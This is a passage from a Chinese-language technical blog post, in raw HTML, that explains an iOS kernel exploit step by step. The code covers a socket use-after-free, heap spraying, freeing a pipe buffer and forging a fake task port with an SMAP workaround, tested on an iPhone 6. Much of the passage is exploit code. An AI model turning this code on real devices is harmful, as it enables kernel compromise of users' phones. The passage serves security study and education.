&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fg_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f_fglob&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_FILEGLOB_FG_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fg_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_PIPE_BUFFER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] pipe buffer: 0x%llx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free_via_uaf()&lt;/code&gt;与函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rk64_via_uaf()&lt;/code&gt;前面部分一样，都是通过创建一堆存在漏洞的Socket，然后去堆喷，只不过这里还要多一步填充结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in6_pktinfo&lt;/code&gt;数据，可以看到我们填充的是一个全为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;的数据，那么就会触发它进行释放操作&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;free_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;set_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found_at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;前期的准备工作到这里就差不多了，我们接下来开始进入一个关键环节：伪造一个Port&lt;/p&gt;

&lt;h2 id=&quot;7-伪造task-port&quot;&gt;7. 伪造Task Port&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;备注：因为SMAP是iPhone 7开始引入的安全机制，内核访问用户态的内存会被限制，而我的测试环境是iPhone 6，所以前面我淡化了SMAP的存在感，但接下来该面对还是要面对&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;申请一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;用于伪造Port，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find_port_via_uaf()&lt;/code&gt;通过OOL数据自动转换Port为内核态地址的机制获取Port的内核态地址&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target_addr&lt;/code&gt;，函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free_via_uaf()&lt;/code&gt;将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipe_buffer&lt;/code&gt;给释放掉，但管道句柄&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fds[0]&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fds[1]&lt;/code&gt;依旧拥有对这个内核缓冲区的读写权限&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_port_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_via_uaf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个循环的操作有点像函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find_port_via_uaf()&lt;/code&gt;，利用自动转换的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;内核态地址占位刚才释放掉的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipe_buffer&lt;/code&gt;，因为我们之前写入了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节，所以这里读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;字节就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipe_buffer&lt;/code&gt;的前&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;个字节数据，判断一下使用两种方法获取到的Port内核态地址是否相同，如果相同就退出循环，如果不同说明堆喷不成功，复位下标继续循环&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fill_kalloc_with_port_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// if we see the address of our port, it worked&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// reset buffer position&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_port_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// spraying didn't work, so free port&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;除了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fds&lt;/code&gt;之外，额外申请一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port_fds&lt;/code&gt;用于绕过SMAP的限制&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当我们获得一个填充满了Port内核态地址的内核缓冲区&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipe_buffer&lt;/code&gt;之后，就需要构造一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_port&lt;/code&gt;结构体了&lt;/p&gt;

&lt;p&gt;将结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_port&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;task&lt;/code&gt;放在了连续的一片内存空间，构建完之后刷一遍&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port_fds&lt;/code&gt;缓冲区&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ktask_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ktask_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;fake_task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_references&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receiver_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgcount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qlimit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_QLIMIT_LARGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;waitq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_waitq_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
